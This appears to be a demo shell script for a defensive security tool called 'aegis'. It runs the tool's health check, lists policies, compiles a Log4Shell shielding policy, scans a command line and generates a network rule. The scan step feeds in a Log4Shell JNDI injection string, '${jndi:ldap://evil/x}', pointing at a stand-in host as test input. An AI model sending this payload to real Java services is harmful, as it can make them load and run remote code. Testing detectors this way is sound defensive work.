#!/usr/bin/env bash
# 一键演示：doctor -> list -> compile -> scan -> gen
set -euo pipefail
cd "$(dirname "$0")/.."

echo "==> doctor"
python -m aegis doctor

echo "==> list"
python -m aegis list

echo "==> compile log4shell-shield"
python -m aegis compile --policy config/policies/log4shell-shield.yaml

echo "==> scan"
python -m aegis scan --cmdline "java -jar app.jar" --argv "java" "-jar" "app.jar" '${jndi:ldap://evil/x}'

echo "==> gen"
python -m aegis gen "block outbound dns except to 10.0.0.53"
